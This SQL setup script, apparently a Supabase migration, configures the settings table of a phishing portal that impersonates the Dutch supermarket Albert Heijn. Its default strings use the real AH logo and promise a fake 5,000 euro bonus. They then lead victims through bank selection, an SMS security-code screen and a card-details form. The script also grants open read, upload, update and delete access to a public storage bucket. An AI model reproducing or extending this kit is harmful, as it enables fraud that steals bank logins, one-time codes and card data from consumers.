CREATE TABLE IF NOT EXISTS public.global_settings (
    id TEXT PRIMARY KEY DEFAULT 'default',
    logo_url TEXT DEFAULT 'https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg',
    bg_url TEXT DEFAULT '/albert-heijn-bg.svg',
    portal_name TEXT DEFAULT 'Albert Heijn klantenportaal',
    support_center_name TEXT DEFAULT 'Albert Heijn service',
    win_title TEXT DEFAULT 'Exclusieve Albert Heijn bonus',
    win_subtitle TEXT DEFAULT 'Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 5.000 euro te claimen.',
    win_button TEXT DEFAULT 'Bonus claimen',
    banken_title TEXT DEFAULT 'Kies je bank',
    banken_subtitle TEXT DEFAULT 'Selecteer je Nederlandse bank om verder te gaan.',
    wait_title TEXT DEFAULT 'Even geduld',
    wait_subtitle TEXT DEFAULT 'Je aanvraag wordt veilig verwerkt...',
    sms_title TEXT DEFAULT 'SMS-beveiligingscode',
    card_title TEXT DEFAULT 'Betaalgegevens',
    card_subtitle TEXT DEFAULT 'Controleer en bevestig je gegevens.',
    created_at TIMESTAMPTZ DEFAULT now(),
    updated_at TIMESTAMPTZ DEFAULT now()
);

ALTER TABLE public.global_settings ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Allow public read access on global_settings" ON public.global_settings;
CREATE POLICY "Allow public read access on global_settings" ON public.global_settings FOR SELECT USING (true);

DROP POLICY IF EXISTS "Allow all for authenticated users on global_settings" ON public.global_settings;
CREATE POLICY "Allow all for authenticated users on global_settings" ON public.global_settings FOR ALL USING (true) WITH CHECK (true);

INSERT INTO public.global_settings (id) VALUES ('default') ON CONFLICT DO NOTHING;

-- Also ensure storage exists
INSERT INTO storage.buckets (id, name, public) VALUES ('assets', 'assets', true) ON CONFLICT DO NOTHING;

DROP POLICY IF EXISTS "Public Access" ON storage.objects;
CREATE POLICY "Public Access" ON storage.objects FOR SELECT USING ( bucket_id = 'assets' );

DROP POLICY IF EXISTS "Allow Uploads" ON storage.objects;
CREATE POLICY "Allow Uploads" ON storage.objects FOR INSERT WITH CHECK ( bucket_id = 'assets' );

DROP POLICY IF EXISTS "Allow Updates" ON storage.objects;
CREATE POLICY "Allow Updates" ON storage.objects FOR UPDATE USING ( bucket_id = 'assets' );

DROP POLICY IF EXISTS "Allow Deletes" ON storage.objects;
CREATE POLICY "Allow Deletes" ON storage.objects FOR DELETE USING ( bucket_id = 'assets' );
